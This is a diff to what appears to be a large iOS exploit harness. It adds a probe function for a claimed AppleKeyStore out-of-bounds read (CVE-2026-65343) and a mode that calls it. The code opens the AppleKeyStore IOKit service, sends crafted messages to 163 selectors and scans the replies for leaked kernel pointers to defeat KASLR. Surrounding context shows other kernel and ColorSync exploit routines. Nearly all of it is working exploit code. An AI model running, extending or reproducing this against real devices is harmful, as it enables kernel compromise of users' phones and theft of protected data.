@@ -31708,6 +31708,146 @@ static void r508_exploit(void) {
     fflush(stdout);
 }
 
+/* aks_kaslr_probe — CVE-2026-65343 AppleKeyStore OOB read probe.
+   Tests whether the AKS OOB read (fixed in 26.6.1) survived into iOS 27.x.
+   Uses direct IOServiceOpen fallback with zero handle — no DYLD_INTERPOSE
+   or Security.framework needed. Minimal test: if IOServiceOpen succeeds and
+   any selector returns kernel pointers, the bug is alive. */
+static void aks_kaslr_probe(void) {
+    rlog("=== CVE-2026-65343: AppleKeyStore OOB read → KASLR probe ===\n\n");
+
+    /* Resolve IOKit symbols via dlsym (IOKit.framework already linked) */
+    typedef mach_port_t io_service_t;
+    typedef mach_port_t io_connect_t;
+
+    io_service_t (*p_IOServiceGetMatchingService)(mach_port_t, CFDictionaryRef) =
+        (io_service_t(*)(mach_port_t, CFDictionaryRef))dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+    CFMutableDictionaryRef (*p_IOServiceMatching)(const char *) =
+        (CFMutableDictionaryRef(*)(const char *))dlsym(RTLD_DEFAULT, "IOServiceMatching");
+    kern_return_t (*p_IOServiceOpen)(io_service_t, mach_port_t, uint32_t, io_connect_t *) =
+        (kern_return_t(*)(io_service_t, mach_port_t, uint32_t, io_connect_t *))dlsym(RTLD_DEFAULT, "IOServiceOpen");
+    kern_return_t (*p_IOServiceClose)(io_connect_t) =
+        (kern_return_t(*)(io_connect_t))dlsym(RTLD_DEFAULT, "IOServiceClose");
+    kern_return_t (*p_IOConnectCallMethod)(
+        io_connect_t, uint32_t,
+        const uint64_t *, uint32_t,
+        const void *, size_t,
+        uint64_t *, uint32_t *,
+        void *, size_t *) =
+        (kern_return_t(*)(io_connect_t, uint32_t,
+            const uint64_t *, uint32_t,
+            const void *, size_t,
+            uint64_t *, uint32_t *,
+            void *, size_t *))dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+
+    if (!p_IOServiceGetMatchingService || !p_IOServiceMatching ||
+        !p_IOServiceOpen || !p_IOServiceClose || !p_IOConnectCallMethod) {
+        rlog("  IOKit symbol resolution failed\n");
+        rlog("\n=== aks_kaslr_probe complete ===\n"); fflush(stdout);
+        return;
+    }
+    rlog("  IOKit symbols resolved\n");
+
+    /* Try to open AppleKeyStore — sandbox may block this */
+    CFMutableDictionaryRef matching = p_IOServiceMatching("AppleKeyStore");
+    io_service_t svc = (io_service_t)p_IOServiceGetMatchingService(0, matching);
+    if (!svc) {
+        rlog("  AppleKeyStore service NOT FOUND\n");
+        rlog("  Likely sandbox-blocked (expected from App Store apps)\n");
+        rlog("  Dev-signed app should have access — check entitlements\n");
+        rlog("\n=== aks_kaslr_probe complete ===\n"); fflush(stdout);
+        return;
+    }
+    rlog("  AppleKeyStore service found: port=%#x\n", svc);
+
+    io_connect_t conn = 0;
+    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) {
+        rlog("  IOServiceOpen FAILED: kr=%#x (%s)\n", kr,
+            kr == 0x2c2 ? "sandbox denial" :
+            kr == 0xe00002c2 ? "sandbox denial" : "unknown");
+        rlog("\n=== aks_kaslr_probe complete ===\n"); fflush(stdout);
+        return;
+    }
+    rlog("  IOServiceOpen OK: conn=%#x\n\n", conn);
+
+    /* Probe 163 selectors with zero ACM handle, declared_length=0x800 */
+    rlog("  Probing selectors 1-163 with declared_length=0x800...\n");
+    int total_kptrs = 0;
+    int sels_with_data = 0;
+
+    for (int sel = 1; sel <= 163; sel++) {
+        /* Build 28-byte input: [0..15]=handle(zero), [16..23]=cmd, [24..27]=declared_len */
+        uint8_t msg[28];
+        memset(msg, 0, sizeof(msg));
+        uint32_t decl = 0x0800;
+        memcpy(msg + 24, &decl, 4);
+
+        uint8_t outbuf[0x2000];
+        memset(outbuf, 0xBB, sizeof(outbuf));
+        size_t outsz = sizeof(outbuf);
+        uint64_t scalo[8] = {0};
+        uint32_t scaln = 8;
+
+        kr = p_IOConnectCallMethod(conn, (uint32_t)sel,
+            NULL, 0, msg, sizeof(msg),
+            scalo, &scaln, outbuf, &outsz);
+
+        /* Check for non-fill bytes (data was returned) */
+        int nonfill = 0;
+        for (int i = 0; i < (int)sizeof(outbuf); i++)
+            if (outbuf[i] != 0xBB) nonfill++;
+
+        if (nonfill == 0 && outsz == sizeof(outbuf)) continue;
+        if (nonfill == 0) continue;
+
+        sels_with_data++;
+        rlog("  sel=%3d kr=%#010x outsz=%zu nonfill=%d\n",
+            sel, (uint32_t)kr, outsz, nonfill);
+
+        /* Scan for kernel pointers (0xfffffff0xxxxxxxx) */
+        int sel_kptrs = 0;
+        for (size_t i = 0; i + 8 <= outsz; i += 8) {
+            uint64_t v;
+            memcpy(&v, outbuf + i, 8);
+            if ((v >> 32) == 0xfffffff0 && (v & 0xffffffffULL) != 0) {
+                rlog("    KPTR @+%04zx = 0x%016llx\n",
+                    i, (unsigned long long)v);
+                sel_kptrs++;
+                if (outsz >= 0x800)
+                    rlog("    *** OOB CONFIRMED: outsz=%zu >= 0x800 ***\n", outsz);
+            }
+        }
+        total_kptrs += sel_kptrs;
+
+        /* Log first few scalar outputs if interesting */
+        if (scaln > 0 && sel_kptrs == 0) {
+            rlog("    scalars:");
+            for (uint32_t si = 0; si < scaln && si < 4; si++)
+                rlog(" [%u]=%#llx", si, (unsigned long long)scalo[si]);
+            rlog("\n");
+        }
+    }
+
+    p_IOServiceClose(conn);
+
+    rlog("\n  Selectors with data: %d\n", sels_with_data);
+    rlog("  Total kernel pointers: %d\n", total_kptrs);
+    if (total_kptrs > 0) {
+        rlog("  *** CVE-2026-65343 ALIVE on iOS 27.1! ***\n");
+        rlog("  *** KASLR defeat possible — need real ACM handle next ***\n");
+    } else if (sels_with_data > 0) {
+        rlog("  Selectors returned data but no kptrs with zero handle\n");
+        rlog("  Bug may still be present — real ACM handle needed\n");
+    } else {
+        rlog("  No data returned from any selector\n");
+        rlog("  Possible: bug fixed, sandbox blocks calls, or zero handle rejected\n");
+    }
+
+    rlog("\n=== aks_kaslr_probe complete ===\n");
+    fflush(stdout);
+}
+
 /* r508_7c_only — Heap-mode CMM splice test.
    VPR=130 (heap path), FunctionType 2, N=9000 outputs, sink-index=1231.
    TBI 0x40 tag on target. Tests ColorSync CMMBase::NewInternal str x19,[x10]. */
@@ -102623,6 +102763,12 @@ new_modes:
             rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
             fflush(stdout);
             r484_exploit();
+            goto done;
+        }
+        if (rounds == 515) {
+            rlog("*** rounds=515: CVE-2026-65343 AppleKeyStore OOB KASLR probe ***\n\n");
+            fflush(stdout);
+            aks_kaslr_probe();
             goto done;
         }
         if (rounds == 514) {
